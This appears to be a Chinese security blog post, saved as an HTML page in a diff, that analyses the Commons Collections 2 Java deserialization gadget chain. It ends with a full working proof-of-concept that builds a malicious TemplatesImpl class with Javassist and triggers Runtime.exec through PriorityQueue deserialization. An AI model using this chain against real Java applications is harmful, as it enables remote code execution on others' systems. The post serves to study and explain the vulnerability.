@@ -1,0 +1,458 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections2利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections2利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="相关知识点
+反序列化链分析
+CC2的链条与CC1最关键的不同是CC2采用动态加载字节码的方式来达到代码执行的目的。
+动态类加载最终会用到ClassLoader中的defineClass方法。通过对调用了ClassLoader中的几个重载的d..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections2利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-29
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="相关知识点">相关知识点</h2>
+<h2 id="反序列化链分析">反序列化链分析</h2>
+<p>CC2的链条与CC1最关键的不同是CC2采用动态加载字节码的方式来达到代码执行的目的。<br>
+动态类加载最终会用到ClassLoader中的defineClass方法。通过对调用了ClassLoader中的几个重载的defineClass方法进行审计，发现<code>com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java</code>中的<code>defineClass</code>方法，该方法不仅调用了<code>ClassLoader#defineClass</code>并且没有指定作用域:</p>
+<pre><code class="language-java">Class defineClass(final byte[] b) {
+      return defineClass(null, b, 0, b.length);
+}
+</code></pre>
+<p>对其查找用法，发现在<code>getTransletInstance</code>方法中有调用</p>
+<pre><code class="language-java">    private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setServicesMechnism(_useServicesMechanism);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+</code></pre>
+<p>在该方法中为了触发<code>defineTransletClasses</code>方法需要满足两个条件<code>_name</code>不能为空、并且<code>_class</code>为空。再追入<code>defineTransletClasses</code>方法</p>
+<pre><code class="language-java">    private void defineTransletClasses()
+        throws TransformerConfigurationException {
+
+        if (_bytecodes == null) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        }
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() {
+                public Object run() {
+                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                }
+            });
+
+        try {
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) {
+                _auxClasses = new HashMap&lt;&gt;();
+            }
+
+            for (int i = 0; i &lt; classCount; i++) {
+                _class[i] = loader.defineClass(_bytecodes[i]);
+                final Class superClass = _class[i].getSuperclass();
+
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                    _transletIndex = i;
+                }
+                else {
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                }
+            }
+
+            if (_transletIndex &lt; 0) {
+                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+        }
+        catch (ClassFormatError e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (LinkageError e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+</code></pre>
+<p>从代码可以看到<code>_bytecodes</code>不能为空，否则报错。若其不为空则实例化<code>TransletClassLoader</code>并返回。这其中需要传入<code>_tfactory.getExternalExtensionsMap()</code>因此不能为空。查看其具体类型：<br>
+<img src="https://limpid94.github.io/post-images/1648627660697.png" alt="" loading="lazy"><br>
+值得注意的是<code>_tfactory</code>被<code>transient</code>修饰，即序列化时不带上该值，因此反序列化时从反序列化数据中读不到。继续查找，发现再readObject方法中进行初始化：<br>
+<img src="https://limpid94.github.io/post-images/1648628430347.png" alt="" loading="lazy"><br>
+因此构造EXP时直接用反射修改其内容即可。</p>
+<pre><code class="language-java">        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+</code></pre>
+<p>以上代码完成了类加载并执行代码的功能，接下来需要知道如何将反序列化的入口点和命令执行的点链接起来。<br>
+这里依旧是用<code>InvokerTransformer#transform</code>方法来反射调用。</p>
+<pre><code class="language-java">InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{});
+</code></pre>
+<p>然后谁来调用<code>InvokerTransformer</code>的<code>transform</code>呢？CC1使用了<code>ChainedTransformer</code>来调用。而CC2则是用<code>TransformingComparator</code>来调用<code>transform</code>。应为在其<code>compare</code>方法中调用了<code>transform</code>方法：</p>
+<pre><code class="language-java">    /**
+     * Returns the result of comparing the values from the transform operation.
+     * 
+     * @param obj1  the first object to transform then compare
+     * @param obj2  the second object to transform then compare
+     * @return negative if obj1 is less, positive if greater, zero if equal
+     */
+    public int compare(Object obj1, Object obj2) {
+        Object value1 = this.transformer.transform(obj1);
+        Object value2 = this.transformer.transform(obj2);
+        return this.decorated.compare(value1, value2);
+    }
+</code></pre>
+<p>而<code>transformer</code>可控，会在构造方法中赋值：</p>
+<pre><code class="language-java">    public TransformingComparator(Transformer transformer, Comparator decorated) {
+        this.decorated = decorated;
+        this.transformer = transformer;
+    }
+</code></pre>
+<h3 id="priorityqueue">PriorityQueue</h3>
+<p>为了能够调用<code>compare</code>方法，Ysoserial给出了PriorityQueue类。</p>
+<blockquote>
+<p>PriorityQueue（优先队列），和普通的queue的差别就在于，它不是简单的先进先出，它的每个元素都有一个自己的“优先级”。每次出列的时候，不再是最先进的先出，而是优先级最高的先出。</p>
+</blockquote>
+<p>通过搜素关键字<code>compare</code>得知一共有2个方法调用到——<code>siftUpUsingComparator()</code>和<code>siftDownUsingComparator()</code>。<br>
+之所以使用<code>siftDownUsingComparator()</code>是因为其被<code>siftDown()</code>所调用：</p>
+<pre><code class="language-java">    private void siftDown(int k, E x) {
+        if (comparator != null)
+            siftDownUsingComparator(k, x);
+        else
+            siftDownComparable(k, x);
+    }
+</code></pre>
+<p>而<code>siftDown()</code>被<code>heapify()</code>调用，后者直接被<code>readObject()</code>调用：</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        // Read in size, and any hidden stuff
+        s.defaultReadObject();
+
+        // Read in (and discard) array length
+        s.readInt();
+
+        queue = new Object[size];
+
+        // Read in all elements.
+        for (int i = 0; i &lt; size; i++)
+            queue[i] = s.readObject();
+
+        // Elements are guaranteed to be in &quot;proper order&quot;, but the
+        // spec has never explained what that might be.
+        heapify();
+    }
+</code></pre>
+<p>在<code>siftDown()</code>中为了能进入<code>siftDownUsingComparator</code>分支，需要让<code>comparator</code>不为空。在该类中查找发现<code>comparator</code>在构造函数中赋值：</p>
+<pre><code class="language-java">    public PriorityQueue(Comparator&lt;? super E&gt; comparator) {
+        this(DEFAULT_INITIAL_CAPACITY, comparator);
+    }
+    ...
+
+    public PriorityQueue(int initialCapacity,
+                         Comparator&lt;? super E&gt; comparator) {
+        // Note: This restriction of at least one is not actually needed,
+        // but continues for 1.5 compatibility
+        if (initialCapacity &lt; 1)
+            throw new IllegalArgumentException();
+        this.queue = new Object[initialCapacity];
+        this.comparator = comparator;
+    }    
+</code></pre>
+<p>因此在初始化的时候可以传入TransformingComparator，同时为了触发比较，还要满足<code>for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</code>因此需要添加2个元素进去。</p>
+<pre><code class="language-java">        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+        priorityQueue.add(templates);
+        priorityQueue.add(2);
+</code></pre>
+<p>为了避免其在序列化时就产生命令执行，这里需要给<code>TransformingComparator</code>先初始化成其他的类，比如<code>new ConstantTransformer(1)</code>，然后再用反射去获取<code>transformer</code>的值然后修改成<code>invokerTransformer</code>。</p>
+<pre><code class="language-java">        Field tField = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        tField.setAccessible(true);
+        tField.set(transformingComparator,invokerTransformer);
+</code></pre>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class CommonCollections2 {
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException, TransformerConfigurationException {
+        //构造.class字节流程
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+//        Class&lt;?&gt; clas = Class.forName(&quot;java.lang.ClassLoader&quot;);
+//        Method defineClass = clas.getDeclaredMethod(&quot;defineClass&quot;, String.class, Byte[].class, int.class, int.class);
+//        defineClass.setAccessible(true);
+//        Class clz = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Evil&quot;, bytecode, 0, bytecode.length);
+//        clz.newInstance();
+        //实例化TemplatesImpl
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        //使用InvokerTransformer。
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{});
+//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+
+        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
+        priorityQueue.add(templates);
+        priorityQueue.add(2);
+
+        Field tField = transformingComparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        tField.setAccessible(true);
+        tField.set(transformingComparator,invokerTransformer);
+
+       mySeriable(priorityQueue);
+        myDeseriable(&quot;sercc2.bin&quot;);
+    }
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;sercc2.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
+        return ois.readObject();
+    }
+
+}
+
+</code></pre>
+<h2 id="参考资料">参考资料</h2>
+<p>https://www.anquanke.com/post/id/232592#h3-13<br>
+https://www.cnblogs.com/depycode/p/13583102.html<br>
+https://blog.csdn.net/rfrder/article/details/119962850</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9">相关知识点</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90">反序列化链分析</a>
+<ul>
+<li><a href="#priorityqueue">PriorityQueue</a></li>
+</ul>
+</li>
+<li><a href="#poc">POC</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-shiro-550-fan-xu-lie-hua-lou-dong-yuan-li/">
+              <h3 class="post-title">
+                【Java反序列化】Shiro 550 反序列化漏洞原理
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
